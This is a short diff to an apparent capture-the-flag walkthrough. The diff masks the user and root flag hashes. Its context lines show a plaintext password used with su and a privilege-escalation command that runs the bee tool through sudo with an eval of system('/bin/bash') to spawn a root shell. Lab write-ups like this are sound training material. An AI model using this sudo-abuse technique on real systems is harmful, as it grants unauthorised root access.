@@ -131,7 +131,7 @@ su johncusack
 Password: BackDropJ2024DS2024
 
 cat ~/user.txt
-6f57eee316d57147f467455026103ed7
+6f57eee316d5714*****************
 ```
 
 Check `sudo` access:
@@ -147,5 +147,5 @@ sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
 
 cat /root/root.txt > /tmp/f
 cat /tmp/f
-b47fde5773706a20f456f96b3f51172d
+b47fde5773706a2*****************
 ```
